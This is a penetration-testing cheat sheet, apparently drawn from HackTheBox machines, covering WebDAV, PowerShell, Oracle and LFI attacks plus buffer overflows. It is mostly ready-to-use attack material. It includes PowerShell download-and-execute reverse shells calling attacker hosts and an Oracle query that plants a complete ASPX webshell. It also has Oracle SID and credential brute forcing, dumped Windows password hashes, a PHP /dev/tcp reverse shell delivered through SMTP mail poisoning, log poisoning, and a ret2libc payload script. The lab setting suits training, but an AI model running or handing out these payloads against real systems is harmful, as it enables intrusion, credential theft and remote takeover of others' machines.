* https://haveibeenpwned.com/
* https://scylla.sh    # provides password, free
* https://dehashed.com/   # provides password, paid

# WebDAV
WebDAV is an extenstion of HTTP that allows clients to perform remote Web content authoring operations. RFC4918.

## Resources
* [Blogpost from Nullbyte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
* HackTheBox: Granny 

## davtest
DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.
```
davtest -url http://10.10.10.15
```

## cadaver
Cadaver is a simple command-line client, similar to for example the 'ftp' program. It has some advanced features such as lock-management, property management, DASL and version control support.
```
cadaver http://10.10.10.15/mfu
```

# PowerShell
## User Management
* add user
```
net user <username> <password> /add /domain
```
* add user to group
```
net group <group> <username> /add
```
## Transfer Files
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
```
## Reverse shell with local authentication
* assuming you already found credentials (for example by running powerup)
```powershell
$pass = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.13:8000/rev.ps1')" -Credential $cred
```

## Misc Commands
### Get-ChildItem
* ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
* ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
* ```-Filter``` Specifies a filter to qualify the Path parameter.
* ```-Recurse``` Gets the items in the specified locations and in all child items of the locations.
* ```-Hidden``` To get only hidden items, use the Hidden parameter.
* ```-ErrorAction``` SilentlyContinue Specifies what action to take if the command encounters an error.
```
Get-ChildItem -Hidden
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```

### Get-Content
```
Get-Content -Path file.txt
Get-Content file.txt | Select -first 10
Get-Content file.txt | Select-String 'searchstring'
Get-Content -Path file.txt | Measure-Object -Word
(Get-Content -Path file.txt)[index]
```

### Select-String
```
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
Select-String -Path file.txt -Pattern 'searchstring'
```

### Get-FileHash
```
Get-FileHash -Algorithm MD5 file.txt
```

### Strings.exe
```
C:\Tools\strings64.exe -accepteula file.exe
```

### Alternate Data Stream (ADS)
Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

```
Get-Item -Path file.exe -Stream *

wmic process call create $(Resolve-Path file.exe:streamname)
```

### Encode Base64
```
$FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
$data = Get-Content $Filename
$data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
[System.Convert]::ToBase64String($data_utf8)
```

# Oracle
## nmap version scan
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-tns-version"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:00 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.097s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```
## nmap SID brute force
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-sid-brute"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:33 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.096s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2703.94 seconds

```

## hydra SID brute force
```
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 18:30:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task
[DATA] attacking oracle-sid://10.10.10.82:1521/
[1521][oracle-sid] host: 10.10.10.82   login: XE
[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
[STATUS] 496.00 tries/min, 496 tries in 00:01h, 80 to do in 00:01h, 16 active
[1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
[1521][oracle-sid] host: 10.10.10.82
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 18:31:35
```

## odat
* see: https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
* install odat
```
pip3 install cx_Oracle
git clone https://github.com/quentinhardy/odat.git
cd odat
```
* bruteforce credentials
```
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Searching valid accounts on the XE SID

[+] Valid credentials found: scott/tiger. Continue... 
```

## Log in to Oracle DB with credentials
### install sqlplus
1. create /opt/oracle
2. download basic, sqlplus and sdk from [here](http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html)
3. unzip
4. create symlink (adjust version number!): ```ln libclntsh.so.12.1 libclntsh.so``` and run ```ldconfig```
5. add the following to /etc/profile or .bashrc/.zshrc (adjust version number!):
```
export PATH=$PATH:/opt/oracle/instantclient_12_1
export SQLPATH=/opt/oracle/instantclient_12_1
export TNS_ADMIN=/opt/oracle/instantclient_12_1
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
export ORACLE_HOME=/opt/oracle/instantclient_12_1
```
6. add oracle libraries to ldconfig:
```
echo "/opt/oracle/instantclient_12_1/" >> /etc/ld.so.conf.d/99_oracle
```
7. done, now run ```sqlplus <username>/<password>@<ip_address>/<SID>;```


### oracle commands
* show users: ```SQL> SELECT USERNAME FROM ALL_USERS ORDER BY USERNAME;```
* show tables: ``` SELECT owner, table_name FROM all_tables;```

## get reverse shell from oracle command line
* connect to oracle DB. make sure to use 'as sysdba' if possible!
```
sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';
```
* oracle command line allows to write file. see [here](http://psoug.org/snippet/UTL_FILE-file-write-to-file-example_538.htm?)
* run the following 'query' to upload an aspx webshell
```
declare
  filehandler UTL_FILE.FILE_TYPE;
begin
  filehandler := UTL_FILE.FOPEN('C:/inetpub/wwwroot', 'mfu.aspx', 'W');
  UTL_FILE.PUTF(filehandler, '<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
');
  UTL_FILE.FCLOSE(filehandler);
end;     
```
* now browse to http://10.10.10.82/mfu.aspx and run commands
* setup webserver with powershell script and a listener
```
powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.29:8000/shell.ps1')"

```

# Memory Analysis
## .dmp file
* see https://www.aldeid.com/wiki/Volatility/Retrieve-password
* install volatility
```
virtualenv -p /usr/bin/pytohn2.7 venv
source venv/bin/activate
pip install pycrypto
pip install setuptools --upgrade
sudo apt install python-dev
pip install pycrpyto
pip install distorm3
sudo git clone https://github.com/volatilityfoundation/volatility
cd volatility
sudo python setup.py install
python vol.py -h
```
* get memory address (hivelist)
```
python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6.1
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat

```
* dump hashes
```
python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump 0xffffc00000028000
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

# Local File Inclusion

## Example
* assume website provides functionality to view files
* if not properly sanitized input like ``../../../../../etc/passwd`` may be possible

## PHPInfo LFI
* see https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
* basic idea: race condition due to saving request (multipart) in file under /tmp/XYZ
* the filename can be found in the phpinfo page under variables
* the request should be as big as possible to increase processing time to win the race
* if you are able to browse/access this file before it gets deleted you have RCE

## LFI + SMPT Reverse Shell
* assume you have local file inclusion like:
```
GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
```
* additionally assume SMTP Port (25) is open
```
# connect
$> telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.

# wait for prompt
220 beep.localdomain ESMTP Postfix

# if enhanced
EHLO asdf

# if not
HELO asdf

# verify receipient
VRFY fanis@localhost
252 2.0.0 fanis@localhost # if exist
550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not

# send mail with payload
mail from: manu@manu.ch
250 2.1.0 Ok
rcpt to: fanis@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>

.
250 2.0.0 Ok: queued as E2517D92FD

```
* setup listener and send request to:
```
/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
```

# Log Poisoning
* For this example a LFI is necessary to work
* prerequisite: accessing the http-log file is needed
* since your user agent is logged for example in /var/log/apache2/access.log you have full control
* modify user agent for example to: ``<?php exec("whoami");?>``
* browse to access log of web server

# SNMP
```bash
snmpwalk
snmpwalk -c public -v2c 10.10.10.116
snmp-check
```

# Buffer Overflow
* check if you can write executable code in the stack with peda: ``checksec``. 
* alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md
* if NX is enabled writing shellcode into buffer will not execute

## Concept
```
     STACK

________________
|   Function   |
----------------
|     Data     |
----------------
|Return Address|
----------------
|Base Pointers |
----------------
|      ^       |
|      |       |
|              |
|    Buffer    |
|              |
|              |
________________
```
* try to exceed buffer and overwrite base pointers and return address
* craft buffer according to the following concept 

```bash
python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
```
* \x90 is a NOP and works like a sled since it gets skipped
* therefore run the binary and check $esp for NOP's
* choose address in middle and paste it as 'memory address in middle of NOPs'
* in the example the offset is 500
* $eip gets overwritten with memory address in middle of NOP's
* NOP's get hit 
* instructions follow until shellcode is hit and executes

## ret2libc
* you need the libc address as kind of a 'base'
* afterwards the stack frame dictates the order the function call and parameters are written
* see this [link](https://newbedev.com/why-must-a-ret2libc-attack-follow-the-order-system-exit-command) (explains it much better)
```
function_address
return_address
parameters
```
* so either try to provide some junk for parameters so the function may return to your payload
* or provide actual exit address and payload as parameter for system()

1. find the libc address 
```bash
ldd <binary>
```
2. find the system() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
3. find the exit() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```
4. find /bin/sh in libc
```bash
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
5. create simple python script to print payload
```python
mport struct

junk = "A" * 52

libc_addr = 0xf7d79000
sh_addr = struct.pack('<I', libc_addr + 0x0015ba0b)
system_addr = struct.pack('<I', libc_addr + 0x0003ada0)
exit_addr = struct.pack('<I', libc_addr + 0x0002e9d0)

payload = junk + system_addr + exit_addr + sh_addr

print payload
```
